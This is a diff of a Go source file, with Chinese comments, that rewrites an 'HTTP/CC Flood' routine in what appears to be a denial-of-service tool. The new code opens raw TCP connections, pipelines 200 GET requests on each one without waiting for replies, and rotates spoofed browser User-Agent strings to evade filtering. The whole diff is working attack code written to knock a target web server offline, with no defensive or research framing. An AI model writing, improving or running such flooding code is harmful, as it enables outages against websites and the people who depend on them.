@@ -388,23 +388,27 @@ func icmpChecksum(data []byte) uint16 {
 	return ^uint16(sum)
 }
 
-// ==================== HTTP/CC Flood ====================
+// ==================== HTTP/CC Flood（优化版：连接复用+批量发送） ====================
 func httpFlood(target string, port int, concurrency int, path string, duration time.Duration, stopCh chan bool, wg *sync.WaitGroup) {
 	defer wg.Done()
-	url := fmt.Sprintf("http://%s:%d%s", target, port, path)
 	deadline := time.Now().Add(duration)
-	client := &http.Client{
-		Transport: &http.Transport{
-			MaxIdleConnsPerHost: concurrency,
-			DisableKeepAlives:   false,
-		},
-		Timeout: 10 * time.Second,
+	addr := fmt.Sprintf("%s:%d", target, port)
+	// 预构造HTTP请求（Keep-Alive）
+	reqBytes := []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", path, target))
+	// 随机User-Agent池
+	uas := [][]byte{
+		[]byte("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
+		[]byte("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"),
+		[]byte("Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"),
+		[]byte("Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.6"),
+		[]byte("Go-http-client/1.1"),
 	}
 	var wg2 sync.WaitGroup
 	for i := 0; i < concurrency; i++ {
 		wg2.Add(1)
-		go func() {
+		go func(id int) {
 			defer wg2.Done()
+			buf := make([]byte, 4096)
 			for {
 				select {
 				case <-stopCh:
@@ -414,13 +418,44 @@ func httpFlood(target string, port int, concurrency int, path string, duration t
 				if time.Now().After(deadline) {
 					return
 				}
-				resp, err := client.Get(url)
-				if err == nil {
-					resp.Body.Close()
-					atomic.AddInt64(&statPPS, 1)
+				// 建立TCP连接
+				conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
+				if err != nil {
+					time.Sleep(50 * time.Millisecond)
+					continue
 				}
+				conn.SetDeadline(deadline)
+				// 在一个连接上批量发送请求（不等响应，Keep-Alive复用连接）
+				req := reqBytes
+				// 随机替换User-Agent
+				ua := uas[id%len(uas)]
+				req = []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", path, target, string(ua)))
+				for j := 0; j < 200; j++ {
+					select {
+					case <-stopCh:
+						conn.Close()
+						return
+					default:
+					}
+					_, err := conn.Write(req)
+					if err != nil {
+						conn.Close()
+						break
+					}
+					atomic.AddInt64(&statPPS, 1)
+					// 每50个请求读取一次响应（避免缓冲区满）
+					if j%50 == 49 {
+						conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
+						conn.Read(buf)
+						conn.SetReadDeadline(deadline)
+					}
+				}
+				// 读取剩余响应并关闭
+				conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
+				conn.Read(buf)
+				conn.Close()
 			}
-		}()
+		}(i)
 	}
 	wg2.Wait()
 }
